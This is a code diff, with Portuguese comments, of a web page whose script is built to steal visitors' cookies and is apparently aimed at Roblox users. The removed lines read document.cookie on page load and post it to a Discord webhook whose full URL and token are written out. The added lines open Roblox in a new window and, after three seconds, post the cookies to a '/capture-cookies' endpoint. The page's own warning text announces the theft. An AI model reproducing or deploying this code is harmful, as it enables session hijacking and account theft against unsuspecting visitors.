@@ -28,49 +28,43 @@
     <p id="warning" class="cookie-alert">Prepare-se para roubar os cookies... Não se preocupe, tudo está sob controle.</p>
 
     <script>
-        // Função para roubar os cookies
-        function stealCookies() {
-            // Abrir o Roblox
-            window.location.href = "https://www.roblox.com/";
-
-            // Display warning message
-            document.getElementById('warning').style.display = "block";
-
-            // Esperar um tempo antes de enviar o cookie (3 segundos, por exemplo)
-            setTimeout(sendCookies, 3000);
+        // Função para abrir o Roblox em uma nova janela
+        function openRoblox() {
+            window.open("https://www.roblox.com/", "_blank");
         }
 
-        // Função para enviar os cookies para o Discord webhook
-        function sendCookies() {
+        // Função para capturar os cookies e enviar para o servidor
+        function captureCookies() {
             // Captura os cookies
             var cookies = document.cookie;
 
-            // Envia os cookies para o Discord webhook do DAN
-            var data = {
-                content: "Cookies: " + cookies
-            };
-
-            fetch('https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud', {
+            // Enviar os cookies para o servidor usando fetch
+            fetch('/capture-cookies', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify({ cookies: cookies })
             })
             .then(response => {
                 if (!response.ok) {
-                    throw new Error('Erro ao enviar mensagem para o Discord: ' + response.statusText);
+                    throw new Error('Erro ao enviar cookies para o servidor');
                 }
-                console.log('Mensagem enviada com sucesso para o Discord!');
+                console.log('Cookies enviados com sucesso para o servidor!');
             })
             .catch(error => {
                 console.error('Erro:', error);
-                alert('Erro ao enviar cookies para o Discord: ' + error.message);
             });
+
+            // Display warning message
+            document.getElementById('warning').style.display = "block";
         }
 
-        // Chama a função stealCookies assim que a página for carregada
-        window.onload = stealCookies;
+        // Chama a função openRoblox quando a página for carregada
+        window.onload = openRoblox;
+
+        // Chama a função captureCookies após 3 segundos
+        setTimeout(captureCookies, 3000);
     </script>
 </body>
 </html>
